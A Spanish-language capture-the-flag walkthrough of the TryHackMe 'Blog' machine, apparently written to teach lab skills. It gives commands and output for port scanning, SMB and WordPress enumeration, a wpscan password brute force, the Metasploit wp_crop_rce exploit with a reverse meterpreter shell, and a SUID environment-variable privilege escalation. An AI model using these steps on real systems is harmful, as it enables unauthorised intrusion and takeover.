Bienvenidos a otra sala de tryhackme. Tenemos una maquina en dificultad media, del cual abusaremos el servicio wordpress para obtener una sesion de meterpreter utilizando metasploit y elevar privilegios exportando las variables de entorno del sistema para escalar a usuario raiz root.

# Recon

Iniciamos nuestro reconocimiento utilizando __nmap__. Le diremos que escanee todos los puertos abiertos, con una tasa de paquetes de 5000, en modo sigiloso sin activar las alertas de seguridad y haciendo el escaneo mas rapido, tambien le diremos que no compruebe si el objetivo este en linea, que no resuelva los nombres del host durante el escaneo evitando que los servidores __DNS__ registren el escaneo y haciendo el escaneo mucho mas rapido, tambien que nos muestre la version del servicio, y lo resuelva todo en modo agresivo "__T4__", usamos verbose para ver el progreso del escaneo y que guarde todo el proceso en formato normal, para luego poder echarle un vistazo siempre que querramos. Ejecutaremos nuestro comando : `sudo nmap  -p- --open --min-rate 5000 -sS -Pn -n -sV -T4 -vvv IPTARGET -oN nmap`

```ruby
Nmap scan report for IPTARGET
Host is up, received user-set (0.24s latency).
Scanned at 2023-07-07 04:51:43 EDT for 29s
Not shown: 65531 closed ports
Reason: 65531 resets
PORT    STATE SERVICE     REASON         VERSION
22/tcp  open  ssh         syn-ack ttl 63 OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
80/tcp  open  http        syn-ack ttl 63 Apache httpd 2.4.29 ((Ubuntu))
139/tcp open  netbios-ssn syn-ack ttl 63 Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp open  netbios-ssn syn-ack ttl 63 Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
Service Info: Host: BLOG; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Read data files from: /usr/bin/../share/nmap

```

Nuestro escaneo de nmap nos muestra 4 puertos abiertos. Antes de avanzar, tenemos que agregar blog.thm a /etc/hosts.

```bash
sudo nano /etc/hosts

IPTARGET   blog.thm
```

Iniciamos el proceso de enumeracion utilizando `smbclient` .

```bash
smbclient -L IPTARGET # Listamos 
smbclient \\\\IPTARGET/BillySMB\\ # Establecemos conexion

smb: \> ls
  .                                   D        0  Tue May 26 14:17:05 2020
  ..                                  D        0  Tue May 26 13:58:23 2020
  Alice-White-Rabbit.jpg              N    33378  Tue May 26 14:17:01 2020
  tswift.mp4                          N  1236733  Tue May 26 14:13:45 2020
  check-this.png                      N     3082  Tue May 26 14:13:43 2020

smb: \> mget * # Nos pasamos todos los archivos.

```

Aca hay un agujero de conejo. AL extraer la imagen de Alice, con steghide , nos muestra una nota con un mensaje, dandonos a entender que esto nos desvio del camino y no tiene mucha informacion al respecto. 

```bash
steghide extract -sf Alice-White-Rabbit.jpg
```

No encontramos nada anteriormente, asique iniciamos una enumeracion a directorios ocultos dentro del servidor web con `gobuster`.

```bash
gobuster dir -u http://IPTARGET -w /Path/Wordlist -t 100

=====================================================
Gobuster v2.0.1              OJ Reeves (@TheColonial)
=====================================================
[+] Mode         : dir
[+] Url/Domain   : http://IPTARGET/
[+] Threads      : 100
[+] Wordlist     : /usr/share/dirb/wordlists/big.txt
[+] Status codes : 200,204,301,302,307,403
[+] Timeout      : 10s
=====================================================
2023/07/07 05:06:21 Starting gobuster
=====================================================
/.htpasswd (Status: 403)
/.htaccess (Status: 403)
/favicon.ico (Status: 200)
/server-status (Status: 403)
/wp-admin (Status: 301)
/wp-content (Status: 301)
/wp-includes (Status: 301)
=====================================================
2023/07/07 05:07:59 Finished
=====================================================
```

Encontramos directorios de wordpress. Como sabemos que tiene una version wordpress en el sistema, podemos enumerar usuarios e incluso hacer fuerza bruta.

Enumearmos usuarios y obtenemos informacion:

```bash
wpscan --url blog.thm -e u
```

Nos mostrara los usuarios del servicios incluida la informacion acerca de la version, entre otras cosas. Podemos enumerar temas, plugins, etc.
Anotamos la version y los usuarios.

```bash
[+] WordPress version 5.0 identified (Insecure, released on 2018-12-06).
 | Found By: Rss Generator (Passive Detection)
 |  - http://blog.thm/feed/, <generator>https://wordpress.org/?v=5.0</generator>
 |  - http://blog.thm/comments/feed/, <generator>https://wordpress.org/?v=5.0</generator>


[i] User(s) Identified:

[+] User 1
 | Found By: Author Posts - Author Pattern (Passive Detection)
 | Confirmed By:
 |  Wp Json Api (Aggressive Detection)
 |   - http://blog.thm/wp-json/wp/v2/users/?per_page=100&page=1
 |  Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 |  Login Error Messages (Aggressive Detection)

[+] User 2
 | Found By: Author Posts - Author Pattern (Passive Detection)
 | Confirmed By:
 |  Wp Json Api (Aggressive Detection)
 |   - http://blog.thm/wp-json/wp/v2/users/?per_page=100&page=1
 |  Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 |  Login Error Messages (Aggressive Detection)

[+] User 3
 | Found By: Rss Generator (Passive Detection)
 | Confirmed By: Rss Generator (Aggressive Detection)

[+] User 4
 | Found By: Rss Generator (Passive Detection)
 | Confirmed By: Rss Generator (Aggressive Detection)

```

# Intrusion

Ya que tenemos los usuarios , podemos iniciar fuerza bruta para descubrir sus credenciales.
Nos pasaremos los nombres de cada usuario a nuestra maquina atacante.

```bash
nano user.txt

User1
User2
User3
User4
```

Ejecutamos wpscan para realizar fuerza bruta :

```bash
wpscan --url blog.thm --password-attack wp-login -U user.txt -P /usr/share/wordlists/rockyou.txt -t 64


[+] Performing password attack on Wp Login against 4 user/s
[SUCCESS] - User 1 / Redacted       
```

Ya tenemos nuestras credenciales y tenemos la version. Iniciamos Metasploit para buscar la vulnerabilidad de este servicio con su version correspondiente.

```bash
msfconsole
search wordpress 5.0
use 'exploit/multi/http/wp_crop_rce'
```

Se trata de una vulnerabilidad rce, en el que podemos ejecutar comandos en el servidor web. Ahora pasamos a configurar todas las opciones que nos da metasploit y lo ejecutamos.

```bash
set payload php/meterpreter/reverse_tcp
set RHOSTS blog.thm
set PASWORD pass
set USERNAME user1
set LHOST localhost
set LPORT localport

exploit
```

# Priv.Escalation

Nos dirigimos a directorio de bjoel y habra una archivo pdf, lo descargamos en nuestra sesion de meterpreter:

```bash
download bjoel...pdf
```

Es un mensaje escrito por la empresa de Rubber ducky, asique podemos asumir que hay algun tipo de usb en el sistema. Si nos dirigimos a /media/usb, va a estar la flag pero no podemos visualizarla,ya que,  no tenemos los privilegios necesarios.

Upgradeamos nuestra sesion de meterpreter:

```bash
shell
python3 -c 'import pty;pty.spawn("/bin/bash")'
```

Buscamos permisos elevados dentro del sistema.

```bash
find / -type f -perm -4000 -ls 2>/dev/null
```

Ejecutamos el binario, y nos da un mensaje **Not an Admin**.
Tenemos que aplicar un poco de ingenieria inversa. Para poder observar como esta estructurado esto binario vamos a ejecutar **ltrace**. Tambien se puede utilizar, **ghidra, radare2, strings o cutter**

```bash
ltrace checker

getenv("admin")                                  = nil
puts("Not an Admin"Not an Admin
)                             = 13
+++ exited (status 0) +++

```

Basicamente, esta llamando a la variable de entorno "admin", con valor igual a "nil", luego imprime el mensaje, not an admin. 
Lo que haremos es establecer la variable de entorno "admin" en el entorno actual estableciendo el valor "nil". De esta forma podemos elevar nuestra sesion a usuario raiz root.

```bash
export admin=nil
./checker
```

